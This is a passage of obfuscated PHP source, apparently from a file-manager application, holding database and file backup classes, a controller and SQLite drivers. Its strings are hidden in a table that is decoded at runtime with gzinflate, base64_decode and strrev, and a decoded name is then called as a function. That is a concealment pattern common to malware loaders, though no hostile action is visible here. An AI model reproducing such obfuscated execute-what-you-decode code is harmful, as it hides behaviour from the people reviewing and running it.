($F≈î¿Î…ÜÊ[$bÆÀÍÇÒ–¶[291]][$bÆÀÍÇÒ–¶[193]][$bÆÀÍÇÒ–¶[723]] == $bÆÀÍÇÒ–¶[87]) { return !0; } if (!isset($F≈î¿Î…ÜÊ[$bÆÀÍÇÒ–¶[728]]) || $F≈î¿Î…ÜÊ[$bÆÀÍÇÒ–¶[728]] == $bÆÀÍÇÒ–¶[191]) { $bÑµ¶≠à∑· = new BackupFile(); if (!$bÑµ¶≠à∑·->index()) { return !1; } } self::set(array($bÆÀÍÇÒ–¶[748] => 1, $bÆÀÍÇÒ–¶[723] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto fòÖµë”°¶; AÒıïÜÏßø: if (isset($dÍøÚè·ÛΩ->task[$FÓòÿêÖãµ[761]])) { $B·√ö’¿∫Ù = $dÍøÚè·ÛΩ->task[$FÓòÿêÖãµ[761]] ? $dÍøÚè·ÛΩ->task[$FÓòÿêÖãµ[761]] : timeFloat(); $Búà‘íú€Á = $B·√ö’¿∫Ù - $dÍøÚè·ÛΩ->task[$FÓòÿêÖãµ[762]]; if ($Búà‘íú€Á >= 0.2) { $dÍ±Ê∏≤âŒ += 1; } } $dÍøÚè·ÛΩ->end(); $a‹¨êéõì◊ = array($FÓòÿêÖãµ[749] => $Bøó∆Ú √Ó, $FÓòÿêÖãµ[746] => 1, $FÓòÿêÖãµ[763] => $dÍ±Ê∏≤âŒ, $FÓòÿêÖãµ[764] => $f∏‹æã◊Ç´, $FÓòÿêÖãµ[765] => time()); goto d–éë™µ—Ù; DÓ¬”Í∂ÆÉ: $Eèˆí∆Í…à = new DbManage($e¨£ØèÓ‡ã, $Bøó∆Ú √Ó); $a‹¨êéõì◊ = array($FÓòÿêÖãµ[749] => $Bøó∆Ú √Ó, $FÓòÿêÖãµ[750] => time()); Backup::set($a‹¨êéõì◊); goto C‘–ëπ¡ã; d–éë™µ—Ù: Backup::set($a‹¨êéõì◊); if ($dÍ±Ê∏≤âŒ - $f∏‹æã◊Ç´ > 1) { write_log(array($FÓòÿêÖãµ[766], $a‹¨êéõì◊), $FÓòÿêÖãµ[755]); return !1; } return !0; goto B“†°«·é¢; cªÆ≈“Ó“≈: $dÍ±Ê∏≤âŒ = $f∏‹æã◊Ç´ = 0; try { $CËúîı—Ë— = $Eèˆí∆Í…à->db()->getTables(); } catch (Exception $c¶ˆ∏ääÁ∏) { return !1; } $CËúîı—Ë— = array_diff($CËúîı—Ë—, array($FÓòÿêÖãµ[752], $FÓòÿêÖãµ[753])); goto E∞¿˘Î«ﬂŒ; fòÖµë”°¶: $FÓòÿêÖãµ =& $_SERVER[Öíæ€“”≠éÏË]; $Bÿã“Ô¥æò = Backup::get(); self::$io = $Bÿã“Ô¥æò[$FÓòÿêÖãµ[725]]; goto eìç›ÒËÍ◊; eìç›ÒËÍ◊: self::$name = $Bÿã“Ô¥æò[$FÓòÿêÖãµ[28]]; $e¨£ØèÓ‡ã = $GLOBALS[$FÓòÿêÖãµ[6]][$FÓòÿêÖãµ[17]]; $Bøó∆Ú √Ó = $this->_dbType($e¨£ØèÓ‡ã); goto DÓ¬”Í∂ÆÉ; E∞¿˘Î«ﬂŒ: foreach ($CËúîı—Ë— as $DÂüäòﬁ°ª) { $dÍ±Ê∏≤âŒ += $Eèˆí∆Í…à->model($DÂüäòﬁ°ª)->count(); } $dÍøÚè·ÛΩ = new Task($FÓòÿêÖãµ[754], $FÓòÿêÖãµ[755], $dÍ±Ê∏≤âŒ, LNG($FÓòÿêÖãµ[756]) . $FÓòÿêÖãµ[757] . LNG($FÓòÿêÖãµ[758])); foreach ($CËúîı—Ë— as $DÂüäòﬁ°ª) { $F¢§ÖÑ‰ÜÀ = $FÆ àÑåà¡ . $DÂüäòﬁ°ª . $FÓòÿêÖãµ[759]; $FØãûüÈ∫’ = null; if ($DÂüäòﬁ°ª == $FÓòÿêÖãµ[760] && (!isset($Bÿã“Ô¥æò[$FÓòÿêÖãµ[728]]) || $Bÿã“Ô¥æò[$FÓòÿêÖãµ[728]] == $FÓòÿêÖãµ[191])) { $FØãûüÈ∫’ = self::$io; } $f∏‹æã◊Ç´ += $Eèˆí∆Í…à->sqlFromDb($DÂüäòﬁ°ª, $F¢§ÖÑ‰ÜÀ, $dÍøÚè·ÛΩ, $FØãûüÈ∫’); } goto AÒıïÜÏßø; C‘–ëπ¡ã: $FÆ àÑåà¡ = $this->tmpFilesPath() . $FÓòÿêÖãµ[751] . self::$name . $FÓòÿêÖãµ[8]; del_dir($FÆ àÑåà¡); mk_dir($FÆ àÑåà¡); goto cªÆ≈“Ó“≈; B“†°«·é¢: } private function _dbType($Eº‰ÓÛêªÉ) { goto bö«ÉÜäˆ«; A‡∑Õ›ˆ´à: return $A„àØ““‰¶; goto DÁﬁﬁ¨ﬁ´é; bö«ÉÜäˆ«: $E¥õ≤”…ä’ =& $_SERVER[Öíæ€“”≠éÏË]; $Eº‰ÓÛêªÉ = array_change_key_case($Eº‰ÓÛêªÉ); $A„àØ““‰¶ = $Eº‰ÓÛêªÉ[$E¥õ≤”…ä’[767]]; goto déÃ˘ÉÁ¡Ü; déÃ˘ÉÁ¡Ü: if ($A„àØ““‰¶ == $E¥õ≤”…ä’[768]) { $eÑê™ŸùÖ¬ = explode($E¥õ≤”…ä’[4], $Eº‰ÓÛêªÉ[$E¥õ≤”…ä’[769]]); $A„àØ““‰¶ = $eÑê™ŸùÖ¬[0]; } $f¯é„ÔÛÁ≤ = array($E¥õ≤”…ä’[770] => $E¥õ≤”…ä’[9], $E¥õ≤”…ä’[771] => $E¥õ≤”…ä’[772]); if (isset($f¯é„ÔÛÁ≤[$A„àØ““‰¶])) { $A„àØ““‰¶ = $f¯é„ÔÛÁ≤[$A„àØ““‰¶]; } goto A‡∑Õ›ˆ´à; DÁﬁﬁ¨ﬁ´é: } private function tmpFilesPath() { $dî∏¶√∞öÇ =& $_SERVER[Öíæ€“”≠éÏË]; $fŒäøßÔÉı = TEMP_FILES; if ($GLOBALS[$dî∏¶√∞öÇ[6]][$dî∏¶√∞öÇ[88]][$dî∏¶√∞öÇ[773]]) { $fŒäøßÔÉı = $GLOBALS[$dî∏¶√∞öÇ[6]][$dî∏¶√∞öÇ[88]][$dî∏¶√∞öÇ[773]]; if (!mk_dir($fŒäøßÔÉı) || !is_writable($fŒäøßÔÉı) || !IO::mkfile($fŒäøßÔÉı . $dî∏¶√∞öÇ[774])) { $fŒäøßÔÉı = TEMP_FILES; } } return $fŒäøßÔÉı; } } class BackupDbFile { public function __construct() { } public function index() { goto eäÑﬂ∞ôåÿ; F·Ñ¡≈Ë¢Ü: $D€Œòù¶ªë = new TaskFileTransfer($FîÛÑ°ë≤√[777], $FîÛÑ°ë≤√[755], count($Cã±âôîÂÌ), LNG($FîÛÑ°ë≤√[756]) . $FîÛÑ°ë≤√[441] . LNG($FîÛÑ°ë≤√[758]) . $FîÛÑ°ë≤√[778]); $D€Œòù¶ªë->task[$FîÛÑ°ë≤√[736]] = $Cõ–¢ÔË»É; foreach ($aÜõ≤õœ≤∞[$FîÛÑ°ë≤√[74]] as $CÃà€ëﬁ∑à) { $Eì‹à•ŒáÀ = IO::move($CÃà€ëﬁ∑à[$FîÛÑ°ë≤√[76]], $A≈èºê§µÊ); if (!$Eì‹à•ŒáÀ) { $D€Œòù¶ªë->end(); $A≤»©¶ìÉù = IO::getLastError($FîÛÑ°ë≤√[779] . $CÃà€ëﬁ∑à[$FîÛÑ°ë≤√[76]] . $FîÛÑ°ë≤√[780] . $A≈èºê§µÊ . $FîÛÑ°ë≤√[518]); write_log($A≤»©¶ìÉù, $FîÛÑ°ë≤√[755]); return !1; } } goto a≠Ü∂◊íŸÁ; D≠≥∂Õ®†◊: if (!$Cõ–¢ÔË»É) { return !1; } $f„âê∆⁄º√ = array($FîÛÑ°ë≤√[775] => $Cõ–¢ÔË»É, $FîÛÑ°ë≤√[776] => time()); Backup::set($f„âê∆⁄º√); goto F·Ñ¡≈Ë¢Ü; b∑Èì»ÁôÉ: $aÜõ≤õœ≤∞ = IO::listPath($f„Ö”‹¨º¿); $Cã±âôîÂÌ = isset($aÜõ≤õœ≤∞[$FîÛÑ°ë≤√[74]]) ? $aÜõ≤õœ≤∞[$FîÛÑ°ë≤√[74]] : array(); $Cõ–¢ÔË»É = array_sum(array_column($Cã±âôîÂÌ, $FîÛÑ°ë≤√[78])); goto D≠≥∂Õ®†◊; a≠Ü∂◊íŸÁ: $aåÜë∑Ò‘∆ = CONTROLLER_DIR . $FîÛÑ°ë≤√[781]; $AÓ–ÖÙÑÀñ = CONTROLLER_DIR . $FîÛÑ°ë≤√[782]; IO::copy($aåÜë∑Ò‘∆, $A≈èºê§µÊ); goto e‡–æå±ˆí; eäÑﬂ∞ôåÿ: $FîÛÑ°ë≤√ =& $_SERVER[Öíæ€“”≠éÏË]; $c√◊»ƒß÷° = Backup::get(); $BÓÔÎëåùﬂ = $c√◊»ƒß÷°[$FîÛÑ°ë≤√[28]]; goto c†‚Çæî†À; e‡–æå±ˆí: IO::copy($AÓ–ÖÙÑÀñ, $A≈èºê§µÊ); $D€Œòù¶ªë->end(); $f„âê∆⁄º√ = array($FîÛÑ°ë≤√[783] => $Cõ–¢ÔË»É, $FîÛÑ°ë≤√[784] => time()); goto D¢£êå‹≠µ; D¢£êå‹≠µ: Backup::set($f„âê∆⁄º√); return !0; goto Aπâ∑è“¢“; c†‚Çæî†À: $f„Ö”‹¨º¿ = $this->tmpFilesPath() . "\x62\141\x63\153\165\x70\137{$BÓÔÎëåùﬂ}\57"; $A≈èºê§µÊ = $this->backupPath($c√◊»ƒß÷°); if (!($A≈èºê§µÊ = IO::mkdir($A≈èºê§µÊ))) { return !1; } goto b∑Èì»ÁôÉ; Aπâ∑è“¢“: } private function backupPath($B∞±©˜ÍÓ) { $cƒ ãœ‰ø… =& $_SERVER[Öíæ€“”≠éÏË]; $aÎƒ‘çƒëé = $B∞±©˜ÍÓ[$cƒ ãœ‰ø…[28]]; $e⁄¥Êöê®Ω = Model($cƒ ãœ‰ø…[743])->get($cƒ ãœ‰ø…[744]); $aÿË•”å á = substr(md5($cƒ ãœ‰ø…[745] . $e⁄¥Êöê®Ω . $aÎƒ‘çƒëé), 0, 8); return "\173\151\x6f\x3a{$B∞±©˜ÍÓ[$cƒ ãœ‰ø…[725]]}\175\x2f\144\141\x74\x61\142\141\x73\145\x2f\x62\x61\143\x6b\x75\160\x2f" . $aÎƒ‘çƒëé . $cƒ ãœ‰ø…[71] . $aÿË•”å á; } private function tmpFilesPath() { $cÖÔ™…ÖÔÍ =& $_SERVER[Öíæ€“”≠éÏË]; $BôÂ¯ÿ¯öÏ = TEMP_FILES; if ($GLOBALS[$cÖÔ™…ÖÔÍ[6]][$cÖÔ™…ÖÔÍ[88]][$cÖÔ™…ÖÔÍ[773]]) { $BôÂ¯ÿ¯öÏ = $GLOBALS[$cÖÔ™…ÖÔÍ[6]][$cÖÔ™…ÖÔÍ[88]][$cÖÔ™…ÖÔÍ[773]]; if (!mk_dir($BôÂ¯ÿ¯öÏ) || !is_writable($BôÂ¯ÿ¯öÏ) || !IO::mkfile($BôÂ¯ÿ¯öÏ . $cÖÔ™…ÖÔÍ[774])) { $BôÂ¯ÿ¯öÏ = TEMP_FILES; } } return $BôÂ¯ÿ¯öÏ; } } goto eí∂⁄œä æ; EËÌ·ãÓÎº: $EùØ˘„ÜÀŒ = $_SERVER[Öíæ€“”≠éÏË][588]; while (strlen($EùØ˘„ÜÀŒ) < $_SERVER[Öíæ€“”≠éÏË][589]) { if (!$EùØ˘„ÜÀŒ) { break; } $EùØ˘„ÜÀŒ++; } $_SERVER[ñÖÀ‰Ø] = explode($_SERVER[Öíæ€“”≠éÏË][590], gzinflate(substr($_SERVER[Öíæ€“”≠éÏË][591], 10, -8))); goto eú¶´ø‚èÁ; a£ƒÀÕ·Ì”: $cÍ‡à·øß÷ = strrev(base64_decode($_SERVER[ü“Ê˝][0])); function binCheckNeq($DöÇ©êèõ◊, $c§»¡Œ¨©ê) { return $DöÇ©êèõ◊ != $c§»¡Œ¨©ê; } $_SERVER[$_SERVER[ü“Ê˝][1]] = $cÍ‡à·øß÷($_SERVER[$_SERVER[ü“Ê˝][2]]); goto F—Ü’⁄ó»Ö; dÖâ≥±ü‡∂: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto añíÀ≠◊‹Á; añíÀ≠◊‹Á: $aƒ∑É≤àµË =& $_SERVER[Öíæ€“”≠éÏË]; global $in, $config; $this->config =& $config; goto a≈âƒ∂Éïé; CŒ·á÷¢ı∑: $this->tpl = TEMPLATE . MOD . $aƒ∑É≤àµË[8]; $this->_classObjectID = mt_rand(0, 10000); goto A·™ÉÏâ©Â; a≈âƒ∂Éïé: $this->in =& $in; $this->values[$aƒ∑É≤àµË[6]] =& $config; $this->values[$aƒ∑É≤àµË[7]] =& $in; goto CŒ·á÷¢ı∑; A·™ÉÏâ©Â: } public function loadClass($eùÖïÈÿçî) { if (1 === func_num_args()) { $this->{$eùÖïÈÿçî} = new $eùÖïÈÿçî(); } else { $B∏ù›œÒ€Ñ = new ReflectionClass($eùÖïÈÿçî); $AËˆï∏ä©Ì = func_get_args(); array_shift($AËˆï∏ä©Ì); $this->{$eùÖïÈÿçî} = $B∏ù›œÒ€Ñ->newInstanceArgs($AËˆï∏ä©Ì); } return $this->{$eùÖïÈÿçî}; } protected function assign($A’Õ’–Ñ⁄ø, $A¨◊µ≥≥Û«) { $this->values[$A’Õ’–Ñ⁄ø] = $A¨◊µ≥≥Û«; } protected function display($BŸë˜ßÃ•®) { ob_end_clean(); extract($this->values); require $this->tpl . $BŸë˜ßÃ•®; } } class DbSqliteBase extends Db { public function __construct($b‰ÈÔ¿Üåç = '') { $Bå‚⁄òŸ¯Ë =& $_SERVER[Öíæ€“”≠éÏË]; if (!extension_loaded($Bå‚⁄òŸ¯Ë[9])) { think_exception(think_lang($Bå‚⁄òŸ¯Ë[10]) . $Bå‚⁄òŸ¯Ë[11]); } if (!empty($b‰ÈÔ¿Üåç)) { if (!isset($b‰ÈÔ¿Üåç[$Bå‚⁄òŸ¯Ë[12]])) { $b‰ÈÔ¿Üåç[$Bå‚⁄òŸ¯Ë[12]] = 438; } $this->config = $b‰ÈÔ¿Üåç; if (empty($this->config[$Bå‚⁄òŸ¯Ë[13]])) { $this->config[$Bå‚⁄òŸ¯Ë[13]] = array(); } } } public function connect($FÒÛê¬Ò±⁄ = '', $CŸÌª’‰÷ﬁ = 0) { $DÆªáÜﬂˆè =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($this->linkID[$CŸÌª’‰÷ﬁ])) { goto dùÜõÆ…Õ–; FÃ§í£·ñ®: @sqlite_busy_timeout($this->linkID[$CŸÌª’‰÷ﬁ], 30000); if (1 != think_config($DÆªáÜﬂˆè[18])) { unset($this->config); } goto a«èÇÇΩ¢ß; dùÜõÆ…Õ–: if (empty($FÒÛê¬Ò±⁄)) { $FÒÛê¬Ò±⁄ = $this->config; } $Eª¶öö⁄„Ë = !empty($FÒÛê¬Ò±⁄[$DÆªáÜﬂˆè[13]][$DÆªáÜﬂˆè[14]]) ? $FÒÛê¬Ò±⁄[$DÆªáÜﬂˆè[13]][$DÆªáÜﬂˆè[14]] : $this->pconnect; $D˘‰Ôıò™û = $Eª¶öö⁄„Ë ? $DÆªáÜﬂˆè[15] : $DÆªáÜﬂˆè[16]; goto bÏ◊©â±ÕÔ; bÏ◊©â±ÕÔ: $this->linkID[$CŸÌª’‰÷ﬁ] = $D˘‰Ôıò™û($FÒÛê¬Ò±⁄[$DÆªáÜﬂˆè[17]], $FÒÛê¬Ò±⁄[$DÆªáÜﬂˆè[12]]); if (!$this->linkID[$CŸÌª’‰÷ﬁ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto FÃ§í£·ñ®; a«èÇÇΩ¢ß: } return $this->linkID[$CŸÌª’‰÷ﬁ]; } public function free() { $this->queryID = null; } public function query($cÖœÃï‹ﬁ©) { goto f’í‰∞°Ÿ˜; A∂œœã©çÜ: think_status($c•äÓ≤≥æ¬[20]); $this->queryID = sqlite_query($this->_linkID, $cÖœÃï‹ﬁ©); $this->debug(); goto AíáŸ¿œû‡; f’í‰∞°Ÿ˜: $c•äÓ≤≥æ¬ =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÈ⁄ËÜ¬Ú√; AíáŸ¿œû‡: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $dÎëäÿí‡ª = $this->getAll(); return $dÎëäÿí‡ª; } goto Fñá–ﬁÃå«; EÈ⁄ËÜ¬Ú√: $this->queryStr = $cÖœÃï‹ﬁ©; if ($this->queryID) { $this->free(); } think_action_status($c•äÓ≤≥æ¬[19], 1); goto A∂œœã©çÜ; Fñá–ﬁÃå«: } public function execute($fñÉ™Æ¶ ï) { goto CπÛœ∆ì‘¡; CπÛœ∆ì‘¡: $Dÿ§‘ ì›⁄ =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a∂±ùàèã—; a∂±ùàèã—: $this->queryStr = $fñÉ™Æ¶ ï; if ($this->queryID) { $this->free(); } think_action_status($Dÿ§‘ ì›⁄[21], 1); goto E›√‘À‘åÎ; E›√‘À‘åÎ: think_status($Dÿ§‘ ì›⁄[20]); $e˘‘ÒÔÃÇµ = sqlite_exec($this->_linkID, $fñÉ™Æ¶ ï); $this->debug(); goto d“ëïöÜŸ¿; d“ëïöÜŸ¿: if (!1 === $e˘‘ÒÔÃÇµ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Dû¯Í‘ƒ¬é; Dû¯Í‘ƒ¬é: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Öíæ€“”≠éÏË][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Aæ∏éé‹æÆ = sqlite_query($this->_linkID, $_SERVER[Öíæ€“”≠éÏË][23]); if (!$Aæ∏éé‹æÆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cñú◊ÿ®à⁄ = sqlite_query($this->_linkID, $_SERVER[Öíæ€“”≠éÏË][24]); if (!$Cñú◊ÿ®à⁄) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $eÍƒÇÒ’ïû = array(); if ($this->numRows > 0) { for ($dƒ–·–‘ü = 0; $dƒ–·–‘ü < $this->numRows; $dƒ–·–‘ü++) { $eÍƒÇÒ’ïû[$dƒ–·–‘ü] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $eÍƒÇÒ’ïû; } public function getFields($E”´ÿıÑìÀ) { $BÇ˜ÎØ’Êœ =& $_SERVER[Öíæ€“”≠éÏË]; $e⁄Öõé°¨ = $this->query($BÇ˜ÎØ’Êœ[25] . $E”´ÿıÑìÀ . $BÇ˜ÎØ’Êœ[26]); $cËÊçüëÁæ = array(); if ($e⁄Öõé°¨) { foreach ($e⁄Öõé°¨ as $EÌ≥¯˜∑•Ê => $bíîß∞ôºÑ) { $cËÊçüëÁæ[$bíîß∞ôºÑ[$BÇ˜ÎØ’Êœ[27]]] = array($BÇ˜ÎØ’Êœ[28] => $bíîß∞ôºÑ[$BÇ˜ÎØ’Êœ[27]], $BÇ˜ÎØ’Êœ[29] => $bíîß∞ôºÑ[$BÇ˜ÎØ’Êœ[30]], $BÇ˜ÎØ’Êœ[31] => (bool) ($bíîß∞ôºÑ[$BÇ˜ÎØ’Êœ[32]] === $BÇ˜ÎØ’Êœ[33]), $BÇ˜ÎØ’Êœ[34] => $bíîß∞ôºÑ[$BÇ˜ÎØ’Êœ[35]], $BÇ˜ÎØ’Êœ[36] => strtolower($bíîß∞ôºÑ[$BÇ˜ÎØ’Êœ[37]]) == $BÇ˜ÎØ’Êœ[38], $BÇ˜ÎØ’Êœ[39] => strtolower($bíîß∞ôºÑ[$BÇ˜ÎØ’Êœ[40]]) == $BÇ˜ÎØ’Êœ[41]); } } return $cËÊçüëÁæ; } public function getTables($E˜ßõ≤ñì” = '') { $c¢é¨¨È…’ =& $_SERVER[Öíæ€“”≠éÏË]; $D≥Êøóø˜≠ = $this->query($c¢é¨¨È…’[42] . $c¢é¨¨È…’[43] . $c¢é¨¨È…’[44]); $F£êƒ–√¿ÿ = array(); foreach ($D≥Êøóø˜≠ as $bÏäåêıÏ∑ => $dôÙ∏ª√•ÿ) { $F£êƒ–√¿ÿ[$bÏäåêıÏ∑] = current($dôÙ∏ª√•ÿ); } return $F£êƒ–√¿ÿ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $bﬂ´‡ΩÜÓì =& $_SERVER[Öíæ€“”≠éÏË]; $fßŒ‰‚öÁ¨ = sqlite_last_error($this->_linkID); $this->error = $fßŒ‰‚öÁ¨ . $bﬂ´‡ΩÜÓì[4] . sqlite_error_string($fßŒ‰‚öÁ¨); if ($bﬂ´‡ΩÜÓì[33] != $this->queryStr) { $this->error .= LNG($bﬂ´‡ΩÜÓì[45]) . $this->queryStr; } think_trace($this->error, $bﬂ´‡ΩÜÓì[33], $bﬂ´‡ΩÜÓì[46]); return $this->error; } public function escapeString($DêïËä„âﬁ) { return sqlite_escape_string($DêïËä„âﬁ); } public function parseLimit($e±ˆùËÂ”Ö) { $AÒ‚’–∆¶û =& $_SERVER[Öíæ€“”≠éÏË]; $a»ñËçâÖû = $AÒ‚’–∆¶û[33]; if (!empty($e±ˆùËÂ”Ö)) { $e±ˆùËÂ”Ö = explode($AÒ‚’–∆¶û[47], $e±ˆùËÂ”Ö); if (count($e±ˆùËÂ”Ö) > 1) { $a»ñËçâÖû .= $AÒ‚’–∆¶û[48] . $e±ˆùËÂ”Ö[1] . $AÒ‚’–∆¶û[49] . $e±ˆùËÂ”Ö[0] . $AÒ‚’–∆¶û[50]; } else { $a»ñËçâÖû .= $AÒ‚’–∆¶û[48] . $e±ˆùËÂ”Ö[0] . $AÒ‚’–∆¶û[50]; } } return $a»ñËçâÖû; } } class DbSqlite3Base extends Db { public function __construct($F°ÉŒº®îÖ = '') { $a´…´◊≥°≈ =& $_SERVER[Öíæ€“”≠éÏË]; if (!class_exists($a´…´◊≥°≈[51])) { think_exception(think_lang($a´…´◊≥°≈[10]) . $a´…´◊≥°≈[52]); } if (!empty($F°ÉŒº®îÖ)) { if (!isset($F°ÉŒº®îÖ[$a´…´◊≥°≈[12]])) { $F°ÉŒº®îÖ[$a´…´◊≥°≈[12]] = 438; } $this->config = $F°ÉŒº®îÖ; if (empty($this->config[$a´…´◊≥°≈[13]])) { $this->config[$a´…´◊≥°≈[13]] = array(); } } } public function connect($bˆéàú˘°¡ = '', $eñË°π‹¯ = 0) { $Dﬁ‡ä¡€ä¯ =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($this->linkID[$eñË°π‹¯])) { if (empty($bˆéàú˘°¡)) { $bˆéàú˘°¡ = $this->config; } $this->linkID[$eñË°π‹¯] = new SQLite3($bˆéàú˘°¡[$Dﬁ‡ä¡€ä¯[17]]); if (!$this->linkID[$eñË°π‹¯]) { think_exception($this->linkID[$eñË°π‹¯]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$eñË°π‹¯]->busyTimeout(30000); if (1 != think_config($Dﬁ‡ä¡€ä¯[18])) { unset($this->config); } } return $this->linkID[$eñË°π‹¯]; } public function free() { $this->queryID = null; } public function query($b¯ïõÍ¿≥Ì) { goto D¬≤å©íîç; D¬≤å©íîç: $cŸê∞ÕÏÆ— =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F¥Ω‹Üøûí; F¥Ω‹Üøûí: $this->queryStr = $b¯ïõÍ¿≥Ì; if ($this->queryID) { $this->free(); } think_action_status($cŸê∞ÕÏÆ—[19], 1); goto C±”î˜ÖˆØ; C±”î˜ÖˆØ: think_status($cŸê∞ÕÏÆ—[20]); $this->queryID = $this->_linkID->query($b¯ïõÍ¿≥Ì); $this->debug(); goto DÇ·’¯ﬁ‡∂; DÇ·’¯ﬁ‡∂: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aºñÏÙçèÒ = $this->getAll(); $this->numRows = count($aºñÏÙçèÒ); return $aºñÏÙçèÒ; } goto b´“≤‹¨°…; b´“≤‹¨°…: } public function execute($d‡¶ÊƒÚ®π) { goto b¢ÿ√ƒçÆ; d≤›‡Ñ∑àò: think_status($bˆË¡÷çÃè[20]); $a¥ıãÃ≈ëü = $this->_linkID->exec($d‡¶ÊƒÚ®π); $this->debug(); goto d≈«üê€‚˜; Eë±†√€œ: $this->queryStr = $d‡¶ÊƒÚ®π; if ($this->queryID) { $this->free(); } think_action_status($bˆË¡÷çÃè[21], 1); goto d≤›‡Ñ∑àò; b¢ÿ√ƒçÆ: $bˆË¡÷çÃè =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eë±†√€œ; d≈«üê€‚˜: if (!1 === $a¥ıãÃ≈ëü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DÖæêÂÿê∞; DÖæêÂÿê∞: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Öíæ€“”≠éÏË][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D˜·Éí◊®  = $this->_linkID->query($_SERVER[Öíæ€“”≠éÏË][23]); if (!$D˜·Éí◊® ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D™∆Çúú˘Â = $this->_linkID->query($_SERVER[Öíæ€“”≠éÏË][24]); if (!$D™∆Çúú˘Â) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D§‰‰êÕÆé = array(); while ($Dñ»Óà≤ëÓ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D§‰‰êÕÆé[] = $Dñ»Óà≤ëÓ; } $this->queryID->reset(); return $D§‰‰êÕÆé; } public function getFields($e◊∞—äıÌ©) { $aí»◊¿‹ç¬ =& $_SERVER[Öíæ€“”≠éÏË]; $EôìËøó£• = $this->query($aí»◊¿‹ç¬[25] . $e◊∞—äıÌ© . $aí»◊¿‹ç¬[26]); $B…∑¢À›ÊŸ = array(); if ($EôìËøó£•) { foreach ($EôìËøó£• as $FŸò•‘Æ€ø => $BÁ·çã⁄¡æ) { $B…∑¢À›ÊŸ[$BÁ·çã⁄¡æ[$aí»◊¿‹ç¬[28]]] = array($aí»◊¿‹ç¬[28] => $BÁ·çã⁄¡æ[$aí»◊¿‹ç¬[28]], $aí»◊¿‹ç¬[29] => $BÁ·çã⁄¡æ[$aí»◊¿‹ç¬[29]], $aí»◊¿‹ç¬[31] => (bool) ($BÁ·çã⁄¡æ[$aí»◊¿‹ç¬[31]] === $aí»◊¿‹ç¬[33]), $aí»◊¿‹ç¬[34] => $BÁ·çã⁄¡æ[$aí»◊¿‹ç¬[53]], $aí»◊¿‹ç¬[36] => (bool) $BÁ·çã⁄¡æ[$aí»◊¿‹ç¬[54]], $aí»◊¿‹ç¬[39] => (bool) $BÁ·çã⁄¡æ[$aí»◊¿‹ç¬[54]]); } } return $B…∑¢À›ÊŸ; } public function getTables($b°êÜ‡á¬Ó = '') { $fèÇéàöÒ∆ =& $_SERVER[Öíæ€“”≠éÏË]; $b–·Öá≠ºÑ = $this->query($fèÇéàöÒ∆[42] . $fèÇéàöÒ∆[43] . $fèÇéàöÒ∆[44]); $AôÜÈˆ÷¬Ω = array(); foreach ($b–·Öá≠ºÑ as $BÜâÑÉ‚œı => $Cçˆ ÔπËÙ) { $AôÜÈˆ÷¬Ω[$BÜâÑÉ‚œı] = current($Cçˆ ÔπËÙ); } return $AôÜÈˆ÷¬Ω; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A»◊¢Ÿ∫∂û =& $_SERVER[Öíæ€“”≠éÏË]; $this->error = $this->_linkID->lastErrorMsg(); if ($A»◊¢Ÿ∫∂û[33] != $this->queryStr) { $this->error .= LNG($A»◊¢Ÿ∫∂û[45]) . $this->queryStr; } think_trace($this->error, $A»◊¢Ÿ∫∂û[33], $A»◊¢Ÿ∫∂û[46]); return $this->error; } public function escapeString($Eı∏“Ç¬à•) { $Fùîˆ∫Õ≤ =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->_linkID) { return $this->_linkID->escapeString($Eı∏“Ç¬à•); } return str_ireplace($Fùîˆ∫Õ≤[55], $Fùîˆ∫Õ≤[56], $Eı∏“Ç¬à•); } public function parseLimit($c√ËÏÌáﬁà) { $d√‰€–Ô∆æ =& $_SERVER[Öíæ€“”≠éÏË]; $d‚Õ…àÎêÙ = $d√‰€–Ô∆æ[33]; if (!empty($c√ËÏÌáﬁà)) { $c√ËÏÌáﬁà = explode($d√‰€–Ô∆æ[47], $c√ËÏÌáﬁà); if (count($c√ËÏÌáﬁà) > 1) { $d‚Õ…àÎêÙ .= $d√‰€–Ô∆æ[48] . $c√ËÏÌáﬁà[1] . $d√‰€–Ô∆æ[49] . $c√ËÏÌáﬁà[0] . $d√‰€–Ô∆æ[50]; } else { $d‚Õ…àÎêÙ .= $d√‰€–Ô∆æ[48] 